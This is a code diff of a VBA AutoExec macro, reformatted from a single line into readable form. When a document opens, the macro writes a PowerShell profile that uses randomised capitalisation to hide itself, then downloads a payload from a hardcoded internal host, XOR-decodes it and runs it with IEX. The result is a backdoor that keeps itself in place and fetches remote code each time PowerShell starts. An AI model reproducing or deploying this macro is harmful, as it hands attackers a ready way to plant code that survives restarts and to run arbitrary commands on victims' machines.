@@ -1,1 +1,37 @@
-Sub AutoExec()'' AutoExec Macro''' Set environment pathDim fso As ObjectUS = CreateObject("WScript.Shell").ExpandEnvironmentStrings("%Homeshare%")Path = US & "\My Documents\WindowsPowerShell"SubDir = US & "\My Documents"PSFile = Path & "\profile.ps1"' Create directory and fileSet fso = CreateObject("Scripting.FileSystemObject")Dim oFile As ObjectIf fso.FolderExists(Path) Then    Else    Set objFolder = fso.CreateFolder(SubDir + "\WindowsPowerShell")End IfIf fso.FileExists(PSFile) Then    Else    Set oFile = fso.CreateTextFile(PSFile, True, True)    oFile.WriteLine "[SYsTem.Net.SeRVICEPoINtMAnager]::ExPEct100CONtINUe = 0;$Wc=New-ObjECt SYsTem.NEt.WeBClieNT;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$wc.HEADeRS.ADD('User-Agent',$u);$WC.ProXy = [SyStem.Net.WebREQUESt]::DeFAUltWebProxY;$wc.ProxY.CREDENTIaLS = [SySTEm.NEt.CredenTIaLCacHe]::DEFaULTNETwOrkCReDENtIALS;$K='Van%,#B;A:O8Zsf}@(+/SRh14!)NP=p*';$I=0;[ChAR[]]$b=([CHar[]]($Wc.DOwNLOAdSTrinG('http://10.35.18.80:8080/index.asp')))|%{$_-BXor$K[$i++%$K.LeNgtH]};IEX ($b-JoIn'')"    oFile.Close    Set fso = Nothing    Set oFile = NothingEnd If' Execute powershell in backgroundSet objShell = CreateObject("WScript.Shell")'objShell.Run ("C:\Temp\ps.exe -File") & Path, 0, FalseEnd Sub
+Sub AutoExec()
+'
+' AutoExec Macro
+'
+'
+　
+' Set environment path
+Dim fso As Object
+US = CreateObject("WScript.Shell").ExpandEnvironmentStrings("%Homeshare%")
+Path = US & "\My Documents\WindowsPowerShell"
+SubDir = US & "\My Documents"
+PSFile = Path & "\profile.ps1"
+　
+' Create directory and file
+Set fso = CreateObject("Scripting.FileSystemObject")
+Dim oFile As Object
+　
+If fso.FolderExists(Path) Then
+    Else
+    Set objFolder = fso.CreateFolder(SubDir + "\WindowsPowerShell")
+End If
+　
+If fso.FileExists(PSFile) Then
+    Else
+    Set oFile = fso.CreateTextFile(PSFile, True, True)
+    oFile.WriteLine "[SYsTem.Net.SeRVICEPoINtMAnager]::ExPEct100CONtINUe = 0;$Wc=New-ObjECt SYsTem.NEt.WeBClieNT;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$wc.HEADeRS.ADD('User-Agent',$u);$WC.ProXy = [SyStem.Net.WebREQUESt]::DeFAUltWebProxY;$wc.ProxY.CREDENTIaLS = [SySTEm.NEt.CredenTIaLCacHe]::DEFaULTNETwOrkCReDENtIALS;$K='Van%,#B;A:O8Zsf}@(+/SRh14!)NP=p*';$I=0;[ChAR[]]$b=([CHar[]]($Wc.DOwNLOAdSTrinG('http://10.35.18.80:8080/index.asp')))|%{$_-BXor$K[$i++%$K.LeNgtH]};IEX ($b-JoIn'')"
+    oFile.Close
+    Set fso = Nothing
+    Set oFile = Nothing
+End If
+　
+' Execute powershell in background
+Set objShell = CreateObject("WScript.Shell")
+'objShell.Run ("C:\Temp\ps.exe -File") & Path, 0, False
+　
+　
+End Sub
